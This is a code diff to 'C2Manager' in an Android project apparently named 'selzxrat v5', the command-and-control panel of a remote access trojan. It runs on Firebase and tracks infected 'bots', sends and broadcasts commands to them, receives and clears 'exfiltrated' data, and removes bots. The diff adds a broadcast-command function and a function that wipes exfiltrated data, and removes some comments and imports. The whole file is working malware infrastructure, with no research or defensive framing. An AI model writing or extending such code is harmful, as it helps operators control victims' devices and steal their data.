@@ -2,8 +2,6 @@ package com.selzxrat.v5
 
 import android.util.Log
 import com.google.firebase.database.*
-import com.google.firebase.storage.FirebaseStorage
-import com.google.firebase.storage.StorageReference
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -64,7 +62,6 @@ object C2Manager {
     private lateinit var broadcastRef: DatabaseReference
     private lateinit var groupsRef: DatabaseReference
 
-    // Callbacks
     private var _onBotUpdate: ((String, BotInfo) -> Unit)? = null
     private var _onCommandReceived: ((C2Command) -> Unit)? = null
     private var _onExfilReceived: ((ExfiltratedData) -> Unit)? = null
@@ -75,7 +72,6 @@ object C2Manager {
     private var commandListener: ValueEventListener? = null
     private var exfilListener: ValueEventListener? = null
 
-    // Register Callbacks
     fun onBotUpdate(callback: (String, BotInfo) -> Unit) { _onBotUpdate = callback }
     fun onCommandReceived(callback: (C2Command) -> Unit) { _onCommandReceived = callback }
     fun onExfilReceived(callback: (ExfiltratedData) -> Unit) { _onExfilReceived = callback }
@@ -83,7 +79,6 @@ object C2Manager {
     fun onConnectionError(callback: (String) -> Unit) { _onConnectionError = callback }
 
     fun initialize() {
-        // PERBAIKAN: Cek apakah sudah diinisialisasi untuk mencegah crash
         if (::database.isInitialized) return 
 
         try {
@@ -101,7 +96,7 @@ object C2Manager {
     }
 
     fun startListening() {
-        if (!::botsRef.isInitialized) return // Safety check
+        if (!::botsRef.isInitialized) return
         listenForBots()
         listenForCommands()
         listenForExfil()
@@ -123,16 +118,11 @@ object C2Manager {
                 _onBotUpdate?.invoke(snapshot.key ?: "", bot)
                 listenBotStatus(snapshot.key ?: "")
             }
-
             override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                 val bot = snapshot.getValue(BotInfo::class.java) ?: return
                 _onBotUpdate?.invoke(snapshot.key ?: "", bot)
             }
-
-            override fun onChildRemoved(snapshot: DataSnapshot) {
-                _onBotDisconnected?.invoke(snapshot.key ?: "")
-            }
-
+            override fun onChildRemoved(snapshot: DataSnapshot) { _onBotDisconnected?.invoke(snapshot.key ?: "") }
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
             override fun onCancelled(error: DatabaseError) {}
         })
@@ -182,6 +172,18 @@ object C2Manager {
         val cmd = C2Command(cmdId, type, payload, System.currentTimeMillis(), "pending")
         commandsRef.child(cmdId).setValue(cmd)
     }
+
+    // --- FUNGSI YANG TADI HILANG ---
+    fun broadcastCommand(type: String, payload: String = "") {
+        val cmdId = broadcastRef.push().key ?: return
+        val cmd = C2Command(cmdId, type, payload, System.currentTimeMillis(), "broadcast")
+        broadcastRef.child(cmdId).setValue(cmd)
+    }
+
+    fun clearExfiltratedData() {
+        exfilRef.removeValue()
+    }
+    // --------------------------------
 
     fun removeBot(deviceId: String) {
         botsRef.child(deviceId).removeValue()
